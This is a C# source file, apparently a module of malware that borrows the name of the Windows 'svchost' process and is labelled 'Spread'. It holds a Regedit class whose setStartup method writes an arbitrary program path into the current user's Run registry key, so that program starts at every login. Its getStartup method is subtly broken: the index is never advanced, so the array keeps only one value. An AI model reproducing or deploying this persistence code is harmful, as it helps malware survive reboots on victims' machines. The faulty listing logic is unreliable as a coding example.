using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Svchost.Spread
{
    static class Regedit
    {
        private static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        private static RegistryKey rkLocal = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

        public static void setStartup(string applicationName, string path)
        {
            rkApp.SetValue(applicationName, path);
        }

        public static string[] getStartup()
        {
            string[] user = rkApp.GetValueNames();
            string[] machine = rkLocal.GetValueNames();
            string[] res = new string[user.Length + machine.Length];

            int id = 0;
            foreach (var VARIABLE in rkLocal.GetValueNames())
            {
                res[id] = rkLocal.GetValue(VARIABLE).ToString();
            }
            foreach (var VARIABLE in rkApp.GetValueNames())
            {
                res[id] = rkApp.GetValue(VARIABLE).ToString();
            }
            
            return res;
        }
    }
}
